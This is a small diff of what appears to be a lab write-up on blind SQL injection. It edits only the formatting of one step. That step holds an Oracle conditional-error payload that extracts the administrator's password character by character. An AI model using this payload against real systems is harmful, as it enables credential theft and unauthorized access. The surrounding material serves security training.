@@ -31,6 +31,6 @@ Analysis:
 
 5. Determine the password for the 'administrator'
 
-   g31CW6mjktuq8Zkd' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,`1`,1)='`a`') || ' -> `gives 500 Internal Error if `**1st**`char is`**a**
+   g31CW6mjktuq8Zkd' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,`1`,1)='`a`') || ' -> `gives 500 Internal Error if` **1st** `char is` **a**
 
    
